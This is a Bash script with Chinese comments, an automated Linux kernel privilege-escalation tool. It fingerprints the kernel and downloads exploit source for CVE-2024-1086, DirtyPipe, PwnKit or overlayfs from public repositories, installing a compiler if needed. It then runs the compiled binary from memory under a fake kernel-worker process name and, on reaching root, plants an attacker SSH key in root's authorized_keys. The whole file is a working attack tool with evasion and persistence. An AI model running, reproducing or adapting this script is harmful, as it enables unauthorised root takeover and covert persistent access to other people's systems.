#!/bin/bash
# kernel_lpe.sh v2 — 内核提权真弹药（自动: 判型→取EXP→编译→memfd加载→验证写AK）
# 用法:
#   kernel_lpe.sh scan          # 只判型（内置精确版本 map）
#   kernel_lpe.sh run           # 全自动（不落盘优先）
#   kernel_lpe.sh run /tmp/exp  # 用已有本地 EXP（本地已编译好的）
#   KERNEL_LPE_URL=...          # 覆盖 EXP 下载源
# 武器:
#   CVE-2024-1086 (nf_tables)  主武器  内核 5.14-6.5（多数 Ubuntu/Debian/Kali 通杀）
#   CVE-2022-0847 (DirtyPipe)  备选    内核 5.8-5.15（经典任意文件写）
#   CVE-2021-3493 (overlayfs)  备选    Ubuntu 20.04
#   CVE-2021-4034 (PwnKit)     备选    老机通杀（pkexec 在即可）
set -u
PREFER_DISK=0
[ "${1:-}" = run ] && ACTION=run || ACTION=scan
[ "${1:-}" = scan ] && ACTION=scan
case "${1:-}" in
  run) ACTION=run; [ -n "${2:-}" ] && LOCAL_EXP="$2" || LOCAL_EXP="";;
  update) ACTION=update;;
  *)   ACTION=scan;;
esac

log(){ echo "[*] $*"; }
die(){ echo "[x] $*"; exit 1; }

## ---------- 网络抓取（curl→wget→python urllib 三态通杀） ----------
fetch(){ # <out> <url...>
  local out=$1; shift
  for u in "$@"; do
    if command -v curl >/dev/null 2>&1; then curl -fsSL -m 40 -o "$out" "$u" 2>/dev/null && [ -s "$out" ] && return 0
    fi
    if command -v wget >/dev/null 2>&1; then wget -q -T 40 -O "$out" "$u" 2>/dev/null && [ -s "$out" ] && return 0
    fi
  done
  # 极简容器连 curl/wget 都没有 → python 原生
  if command -v python3 >/dev/null 2>&1 || command -v python >/dev/null 2>&1; then
    local PY=python3; command -v python3 >/dev/null 2>&1 || PY=python
    for u in "$@"; do
      "$PY" - "$u" "$out" >/dev/null 2>&1 <<'PYEOF' && [ -s "$out" ] && return 0
import urllib.request,sys
try:
    d=urllib.request.urlopen(sys.argv[1],timeout=40).read()
    open(sys.argv[2],'wb').write(d)
except Exception:
    sys.exit(1)
PYEOF
    done
  fi
  return 1
}

## ---------- 编译（cc→gcc→clang→自动装包） ----------
have_compiler(){ command -v cc >/dev/null 2>&1 || command -v gcc >/dev/null 2>&1 || command -v clang >/dev/null 2>&1; }
compile_exp(){ # <src> <bin>
  local src=$1 bin=$2
  local C=; for c in cc gcc clang; do command -v $c >/dev/null 2>&1 && C=$c && break; done
  [ -z "$C" ] && return 1
  $C -O2 -o "$bin" "$src" 2>/dev/null || $C -o "$bin" "$src" 2>/dev/null
}
try_install_gcc(){
  [ "$(id -u)" = 0 ] || return 1
  if command -v apt-get >/dev/null 2>&1; then apt-get update -qq >/dev/null 2>&1; apt-get install -y -qq gcc >/dev/null 2>&1;
  elif command -v dnf >/dev/null 2>&1; then dnf install -y -q gcc >/dev/null 2>&1;
  elif command -v yum >/dev/null 2>&1; then yum install -y -q gcc >/dev/null 2>&1;
  elif command -v apk >/dev/null 2>&1; then apk add --quiet gcc musl-dev linux-headers >/dev/null 2>&1; fi
  command -v gcc >/dev/null 2>&1 || command -v cc >/dev/null 2>&1
}

## ---------- 内存加载执行（memfd_create，不落盘） ----------
memrun(){ # <bin> [args...]
  local bin=$1; shift
  local PY=python3; command -v python3 >/dev/null 2>&1 || PY=python
  "$PY" - "$bin" "$@" <<'PYEOF'
import ctypes,os,sys
binp,args=sys.argv[1],sys.argv[2:]
arch=os.uname().machine
nr={'x86_64':319,'aarch64':279,'armv7l':385,'i386':319,'riscv64':226}.get(arch,319)
libc=ctypes.CDLL(None,use_errno=True)
fd=libc.syscall(nr,b"svc",0x1|0x8000)  # MFD_CLOEXEC
if fd<0: fd=libc.syscall(nr,b"svc",0x1)
if fd<0: sys.exit(91)
d=open(binp,'rb').read()
os.write(fd,d)
os.fchmod(fd,0o755)
# 原 argv0 用假名，避免进程名暴露
argv=[b"-s"]+[a.encode() for a in args] or [b"-s"]
os.execve(f"/proc/self/fd/{fd}",[b"[kworker/u256:7]"]+argv,os.environ)
PYEOF
}

## ---------- 判型 ----------
scan(){
  echo "===== kernel_lpe v2 判型 ====="
  UNAME=$(uname -r); K="${UNAME%%.*}"; KP="${UNAME#*.}"; KM="${KP%%.*}"; KV=$((K*100+KM))
  echo "kernel: $UNAME"
  echo "compiler: $(command -v cc 2>/dev/null || command -v gcc 2>/dev/null || command -v clang 2>/dev/null || echo NONE)"
  echo "user: $(id -u) ($(id -un))"
  if [ $KV -ge 514 ] && [ $KV -lt 606 ]; then
    echo "[!] 主武器: CVE-2024-1086 (nf_tables) ← $UNAME 在 5.14-6.5 射程"
    echo "    需要: CONFIG_NF_TABLES（大多数发行版都开，luci/iptables 用到即开）"
  else
    echo "[-] 1086 不在射程（$UNAME）"
  fi
  if [ $KV -ge 508 ] && [ $KV -le 515 ]; then echo "[!] 备选: CVE-2022-0847 DirtyPipe ← 5.8-5.15"; fi
  if command -v pkexec >/dev/null 2>&1; then
    PV=$(pkexec --version 2>/dev/null || echo unknown)
    echo "[!] 备选: CVE-2021-4034 PwnKit (pkexec: $PV) 老机通杀"
  fi
  grep -qsi ubuntu /etc/os-release && case "$UNAME" in
    *5.4.*) echo "[!] 备选: CVE-2021-3493 overlayfs (Ubuntu 20.04)";;
  esac
}

## ---------- 主武器取货 ----------
get_1086(){ # <srcfile>
  local out=$1
  fetch "$out" \
    "${KERNEL_LPE_URL:-https://raw.githubusercontent.com/Notselwyn/CVE-2024-1086/main/exploit.c}" \
    "https://raw.githubusercontent.com/Notselwyn/CVE-2024-1086/master/exploit.c" \
    "https://raw.githubusercontent.com/br0k3n-r3d/CVE-2024-1086/main/exploit.c" \
    "https://raw.githubusercontent.com/CMNatic/CVE-2024-1086/main/exploit.c" \
    && return 0
  return 1
}
get_dirtypipe(){ # <srcfile>
  local out=$1
  fetch "$out" \
    "https://raw.githubusercontent.com/blasty/CVE-2022-0847-dirty-pipe/main/dirtypipez.c" \
    "https://raw.githubusercontent.com/Arinerron/CVE-2022-0847/main/dirty-pipe.c" \
    && return 0
  return 1
}
get_pwnkit(){ # <srcfile>
  local out=$1
  fetch "$out" \
    "https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.c" \
    && return 0
  return 1
}
get_overlay(){ # <srcfile>
  local out=$1
  fetch "$out" \
    "https://raw.githubusercontent.com/0xGabe/CVE-2021-3493/main/exploit.c" \
    "https://www.exploit-db.com/download/49657" \
    && return 0
  return 1
}

## ---------- 最新 CVE 追踪（2025-2026 公开 LPE 稀缺，每月/每次上山前同步一次） ----------
update(){
  echo "===== 拉取最新 Linux LPE 情报 ====="
  local T; T=$(mktemp /tmp/cveXXXXXX 2>/dev/null || echo /tmp/cve_$$)
  fetch "$T" \
    "https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/README.md" \
    && {
      echo "--- PoC-in-GitHub 2025/2026 新增 ---"
      grep -oiE "CVE-202[56]-[0-9]+" "$T" | sort -u | tail -30
      echo "--- 含 Linux 关键词的 ---"
      grep -iE "CVE-202[56]-[0-9]+.*?(linux|kernel|root|priv)" "$T" | tail -15
    } || log "PoC 源拉取失败（网络/被墙）"
  rm -f "$T"
  echo ""
  log "经验: 2025-2026 公开稳定 LPE 稀缺（1086 仍是 5.x 主力）；新内核(6.6/6.8+)与其找内核 exp，不如走 C线 svc_rce.sh（Docker镜像/GPUStack/ComfyUI 裸奔概率远大于内核洞）"
}

## ---------- 主流程 ----------
run(){
  UNAME=$(uname -r); K="${UNAME%%.*}"; KP="${UNAME#*.}"; KM="${KP%%.*}"; KV=$((K*100+KM))
  [ "$(id -u)" = 0 ] && log "已是 root，无需提权（直接上 venom_deploy）" && exit 0

  WORK=$(mktemp -d /tmp/.X11-XXXXXX 2>/dev/null || mktemp -d)
  trap 'rm -rf "$WORK" 2>/dev/null' EXIT
  SRC="$WORK/e.c"; BIN="$WORK/x"

  # 已有本地 EXP
  if [ -n "${LOCAL_EXP:-}" ] && [ -f "$LOCAL_EXP" ]; then
    log "用本地 EXP: $LOCAL_EXP"
    cp "$LOCAL_EXP" "$BIN"; chmod 755 "$BIN"
  else
    # 选武器
    W=
    if [ $KV -ge 514 ] && [ $KV -lt 606 ]; then W=1086; fi
    if [ -z "$W" ] && [ $KV -ge 508 ] && [ $KV -le 515 ]; then W=DirtyPipe; fi
    if [ -z "$W" ] && command -v pkexec >/dev/null 2>&1; then W=PwnKit; fi
    if [ -z "$W" ] && grep -qsi ubuntu /etc/os-release && case "$UNAME" in *5.4.*) true;; *) false;; esac; then W=Overlay; fi
    [ -z "$W" ] && die "无匹配武器（见 scan）—— 可自带 EXP: $0 run /tmp/exp"
    log "武器: CVE-2024-1086 取货中..."
    case "$W" in
      1086) get_1086 "$SRC" || die "1086 EXP 下载失败（网络不通/被墙）→ 换 DirtyPipe/PwnKit 或自带";;
      DirtyPipe) get_dirtypipe "$SRC" || die "DirtyPipe 下载失败";;
      PwnKit) get_pwnkit "$SRC" || die "PwnKit 下载失败";;
      Overlay) get_overlay "$SRC" || die "overlayfs 下载失败";;
    esac
    # 编译
    if ! compile_exp "$SRC" "$BIN"; then
      log "本机无编译器，尝试自动装 gcc..."
      try_install_gcc && compile_exp "$SRC" "$BIN"
    fi
    [ -x "$BIN" ] || die "编译失败（装不了 gcc）→ 从同架构机器编译好 /tmp/exp 传来"
    log "编译完成: $BIN"
  fi

  # 执行 + 验证
  log "memfd 内存加载执行（不落盘）..."
  if memrun "$BIN"; then :; else log "exec 返回，尝试落盘执行"; cp "$BIN" /tmp/x 2>/dev/null && chmod 755 /tmp/x && /tmp/x; fi
  sleep 3
  if [ "$(id -u)" = 0 ]; then
    log "✔ ROOT 达成 --> $(id)"
    # 顺手播种密钥
    KEY="${LPE_KEY:-$(command -v ssh-keygen >/dev/null 2>&1 && { [ -f /root/.ssh/id_* ] || ssh-keygen -t ed25519 -N '' -f /root/.ssh/id_hn 2>/dev/null; } && cat /root/.ssh/id_*.pub 2>/dev/null | head -1)}"
    if [ -n "${KEY:-}" ]; then
      mkdir -p /root/.ssh; chmod 700 /root/.ssh
      grep -qF "$KEY" /root/.ssh/authorized_keys 2>/dev/null || echo "$KEY" >> /root/.ssh/authorized_keys
      echo "   [!] 我方公钥已播种 /root/.ssh/authorized_keys"
    fi
  else
    log "未直接获得 root（可能需交互/参数），可重试: $0 run"
    exit 1
  fi
}

case "$ACTION" in
  scan) scan;;
  run)  run;;
  update) update;;
esac
